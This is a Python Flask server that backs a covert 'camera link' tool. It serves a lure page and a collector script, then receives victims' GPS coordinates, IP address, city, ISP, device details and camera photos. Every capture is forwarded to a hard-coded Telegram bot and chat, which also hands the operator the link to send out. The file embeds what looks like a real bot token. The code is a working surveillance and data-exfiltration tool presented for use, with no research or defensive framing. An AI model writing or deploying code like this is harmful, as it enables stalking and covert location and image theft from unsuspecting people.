from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import requests
import base64
import os

app = Flask(__name__)
CORS(app)

TELEGRAM_TOKEN = "8297814648:AAFq1NN1zCoewVAeKy25Mg7ggRzgyKdq9gA"
TELEGRAM_CHAT_ID = "7361880623"
APP_URL = "https://YOUR-RAILWAY-URL.up.railway.app"

def send_telegram(data):
    msg = f"""🎯 New Session
🕐 {data.get('timestamp')}
🆔 {data.get('sessionId')}

📍 GPS: {data.get('gps',{}).get('lat','?')}, {data.get('gps',{}).get('lon','?')}
🌐 IP: {data.get('network',{}).get('ip','?')}
🏙 City: {data.get('network',{}).get('city','?')}
📡 ISP: {data.get('network',{}).get('isp','?')}
📱 {data.get('device',{}).get('platform','?')}"""

    try:
        requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage',
                     json={'chat_id': TELEGRAM_CHAT_ID, 'text': msg})
    except:
        pass

    if data.get('photo'):
        try:
            b = base64.b64decode(data['photo'].split(',')[1])
            requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto',
                         data={'chat_id': TELEGRAM_CHAT_ID, 'caption': '📸 Camera'},
                         files={'photo': ('p.jpg', b, 'image/jpeg')})
        except:
            pass

@app.route('/collect', methods=['POST'])
def collect():
    send_telegram(request.json)
    return jsonify({'status': 'ok'})

@app.route('/')
def index():
    return send_from_directory('.', 'webpage.html')

@app.route('/collector.js')
def js():
    return send_from_directory('.', 'collector.js')

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if 'message' in update:
        chat_id = update['message']['chat']['id']
        text = update['message'].get('text', '')
        if text == '/start' or text == '/link':
            link = APP_URL
            msg = f"""🔗 Your Camera Link is Ready!

👉 {link}

📸 Opens camera + location
📩 Sends photo + GPS to you"""
            requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage',
                         json={'chat_id': chat_id, 'text': msg})
    return jsonify({'status': 'ok'})

@app.route('/setup_webhook')
def setup_webhook():
    webhook_url = f"{APP_URL}/webhook"
    r = requests.get(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/setWebhook?url={webhook_url}')
    return jsonify(r.json())

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
